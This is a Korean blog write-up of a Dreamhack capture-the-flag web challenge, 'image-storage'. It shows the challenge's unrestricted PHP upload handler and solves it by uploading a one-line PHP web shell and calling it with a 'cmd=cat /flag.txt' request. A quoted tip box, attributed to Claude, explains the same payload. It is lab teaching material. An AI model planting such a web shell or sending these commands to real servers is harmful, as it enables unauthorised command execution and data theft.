---
title: "[Dreamhack] image-storage 해설"
author: jyp
date: 2026-04-03 12:00:00 +0900
categories: [Dreamhack]
tags: [dreamhack , WebHacking]
math: true
---

# 문제 정보

> PHP WebShell 설치를 통한 해킹

## **문제 이름**: image-storage
## **난이도**: Lv.1
## **카테고리**: 웹해킹

---

# 문제 구조

## 문제파일구성

```
/
├── index.php
├── list.php
└── upload.php
```

## 주요 코드

```php
//upload.php

<?php
  if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_FILES)) {
      $directory = './uploads/';
      $file = $_FILES["file"];
      $error = $file["error"];
      $name = $file["name"];
      $tmp_name = $file["tmp_name"];
     
      if ( $error > 0 ) {
        echo "Error: " . $error . "<br>";
      }else {
        if (file_exists($directory . $name)) {
          echo $name . " already exists. ";
        }else {
          if(move_uploaded_file($tmp_name, $directory . $name)){
            echo "Stored in: " . $directory . $name;
          }
        }
      }
    }else {
        echo "Error !";
    }
    die();
  }
?>
<html>
<head>
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.2/css/bootstrap.min.css">
<title>Image Storage</title>
</head>
<body>
    <!-- Fixed navbar -->
    <nav class="navbar navbar-default navbar-fixed-top">
      <div class="container">
        <div class="navbar-header">
          <a class="navbar-brand" href="/">Image Storage</a>
        </div>
        <div id="navbar">
          <ul class="nav navbar-nav">
            <li><a href="/">Home</a></li>
            <li><a href="/list.php">List</a></li>
            <li><a href="/upload.php">Upload</a></li>
          </ul>
        </div><!--/.nav-collapse -->
      </div>
    </nav><br/><br/><br/>
    <div class="container">
      <form enctype='multipart/form-data' method="POST">
        <div class="form-group">
          <label for="InputFile">파일 업로드</label>
          <input type="file" id="InputFile" name="file">
        </div>
        <input type="submit" class="btn btn-default" value="Upload">
      </form>
    </div> 
</body>
</html>
```

`/upload`주소에 접속시 파일들을 업로드 할 수 있는 곳이 존재하고, 업로드 시 `/uploads`주소에 저장되게 된다.

# 풀이

## 웹쉘 업로드하기


> 웹쉘이란? by Claude
{: .prompt-tip }

> PHP를 실행할 수 있는 웹 서버에서 명령어를 실행할 수 있는 파일이에요.
>
> 예를 들어 이런 PHP 파일을 올리면:
> ```php
> <?php system($_GET['cmd']); ?>
> ```
> 브라우저에서 이렇게 접근하면:
> ```
> http://사이트/uploads/shell.php?cmd=cat /flag.txt
> ```
> 서버에서 `cat /flag.txt` 명령어가 실행되고 결과가 화면에 출력돼요.

사이트에 업로드할 웹쉘 파일을 만든다.

```php
//key.php
<?php system($_GET['cmd']); ?>
```
`key.php`라는 파일을 만들고 해당 명령어를 작성한 뒤에, 서버에 해당 파일을 업로드한다.
`key.php`를 업로드 한 뒤에 서버의 폴더 구성은 다음과 같을 것이다.
```
/
├── index.php
├── list.php
├── upload.php
└── uploads
    └── key.php
```

## 웹쉘 사용하기

이제 `/uploads/key.php`에 위치한 웹쉘을 이용해서 `flag`를 탈취한다.
문제의 설명에서 `flag`는 /flag.txt라는 절대 경로에 위치하고 있으므로,

```
http://<사이트주소>/uploads/key.php?cmd=cat /flag.txt
```

해당 요청을 전송하면 `flag.txt`파일의 내용물을 얻어낼 수 있다.

# 정답

웹쉘 설치 후 

```
http://<사이트주소>/uploads/key.php?cmd=cat /flag.txt
```



